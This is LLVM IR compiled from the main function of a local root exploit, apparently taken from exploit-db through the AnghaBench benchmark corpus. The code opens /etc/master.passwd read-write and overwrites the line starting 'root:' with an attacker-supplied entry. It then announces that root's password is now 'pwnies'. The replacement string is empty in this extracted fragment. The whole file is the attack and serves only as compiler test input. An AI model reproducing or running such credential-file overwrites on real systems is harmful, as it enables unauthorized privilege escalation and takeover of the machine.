; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_37167.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_37167.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.stat = type { i64 }

@.str = private unnamed_addr constant [19 x i8] c"/etc/master.passwd\00", align 1
@.str.1 = private unnamed_addr constant [59 x i8] c"[+] MyLittleUnix <=3.0 VFS permissions local root exploit\0A\00", align 1
@O_RDWR = common dso_local global i32 0, align 4
@.str.2 = private unnamed_addr constant [26 x i8] c"[!] No pwn for you pwnie\0A\00", align 1
@SEEK_SET = common dso_local global i32 0, align 4
@.str.3 = private unnamed_addr constant [2 x i8] c"\0A\00", align 1
@.str.4 = private unnamed_addr constant [6 x i8] c"root:\00", align 1
@pwnystr = common dso_local global i8* null, align 8
@.str.5 = private unnamed_addr constant [56 x i8] c"[-] 20percent COOLER! user 'root' password is 'pwnies'\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca %struct.stat*, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i8*, align 8
  store i32 0, i32* %1, align 4
  %8 = call i8* @malloc(i32 8)
  %9 = bitcast i8* %8 to %struct.stat*
  store %struct.stat* %9, %struct.stat** %4, align 8
  store i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str, i64 0, i64 0), i8** %7, align 8
  %10 = call i32 @printf(i8* getelementptr inbounds ([59 x i8], [59 x i8]* @.str.1, i64 0, i64 0))
  %11 = load i8*, i8** %7, align 8
  %12 = load i32, i32* @O_RDWR, align 4
  %13 = call i32 @open(i8* %11, i32 %12)
  store i32 %13, i32* %2, align 4
  %14 = load i8*, i8** %7, align 8
  %15 = load %struct.stat*, %struct.stat** %4, align 8
  %16 = call i32 @stat(i8* %14, %struct.stat* %15)
  store i32 %16, i32* %3, align 4
  %17 = load %struct.stat*, %struct.stat** %4, align 8
  %18 = getelementptr inbounds %struct.stat, %struct.stat* %17, i32 0, i32 0
  %19 = load i64, i64* %18, align 8
  %20 = trunc i64 %19 to i32
  %21 = call i8* @malloc(i32 %20)
  store i8* %21, i8** %5, align 8
  %22 = load i8*, i8** %5, align 8
  %23 = icmp ne i8* %22, null
  br i1 %23, label %24, label %31

24:                                               ; preds = %0
  %25 = load i32, i32* %2, align 4
  %26 = load i8*, i8** %5, align 8
  %27 = load %struct.stat*, %struct.stat** %4, align 8
  %28 = getelementptr inbounds %struct.stat, %struct.stat* %27, i32 0, i32 0
  %29 = load i64, i64* %28, align 8
  %30 = call i32 @read(i32 %25, i8* %26, i64 %29)
  br label %34

31:                                               ; preds = %0
  %32 = call i32 @printf(i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.2, i64 0, i64 0))
  %33 = call i32 @exit(i32 0) #3
  unreachable

34:                                               ; preds = %24
  %35 = load i32, i32* %2, align 4
  %36 = load i32, i32* @SEEK_SET, align 4
  %37 = call i32 @lseek(i32 %35, i32 0, i32 %36)
  %38 = load i8*, i8** %5, align 8
  %39 = call i8* @strtok(i8* %38, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.3, i64 0, i64 0))
  store i8* %39, i8** %6, align 8
  br label %40

40:                                               ; preds = %62, %34
  %41 = load i8*, i8** %6, align 8
  %42 = icmp ne i8* %41, null
  br i1 %42, label %43, label %64

43:                                               ; preds = %40
  %44 = load i8*, i8** %6, align 8
  %45 = call i64 @strstr(i8* %44, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.4, i64 0, i64 0))
  %46 = icmp ne i64 %45, 0
  br i1 %46, label %47, label %53

47:                                               ; preds = %43
  %48 = load i32, i32* %2, align 4
  %49 = load i8*, i8** @pwnystr, align 8
  %50 = load i8*, i8** @pwnystr, align 8
  %51 = call i32 @strlen(i8* %50)
  %52 = call i32 @write(i32 %48, i8* %49, i32 %51)
  br label %62

53:                                               ; preds = %43
  %54 = load i32, i32* %2, align 4
  %55 = load i8*, i8** %6, align 8
  %56 = load i8*, i8** %6, align 8
  %57 = call i32 @strlen(i8* %56)
  %58 = call i32 @write(i32 %54, i8* %55, i32 %57)
  %59 = load i32, i32* %2, align 4
  %60 = call i32 @strlen(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.3, i64 0, i64 0))
  %61 = call i32 @write(i32 %59, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.3, i64 0, i64 0), i32 %60)
  br label %62

62:                                               ; preds = %53, %47
  %63 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.3, i64 0, i64 0))
  store i8* %63, i8** %6, align 8
  br label %40

64:                                               ; preds = %40
  %65 = load i32, i32* %2, align 4
  %66 = call i32 @close(i32 %65)
  %67 = call i32 @printf(i8* getelementptr inbounds ([56 x i8], [56 x i8]* @.str.5, i64 0, i64 0))
  %68 = call i32 @exit(i32 0) #3
  unreachable
}

declare dso_local i8* @malloc(i32) #1

declare dso_local i32 @printf(i8*) #1

declare dso_local i32 @open(i8*, i32) #1

declare dso_local i32 @stat(i8*, %struct.stat*) #1

declare dso_local i32 @read(i32, i8*, i64) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @lseek(i32, i32, i32) #1

declare dso_local i8* @strtok(i8*, i8*) #1

declare dso_local i64 @strstr(i8*, i8*) #1

declare dso_local i32 @write(i32, i8*, i32) #1

declare dso_local i32 @strlen(i8*) #1

declare dso_local i32 @close(i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
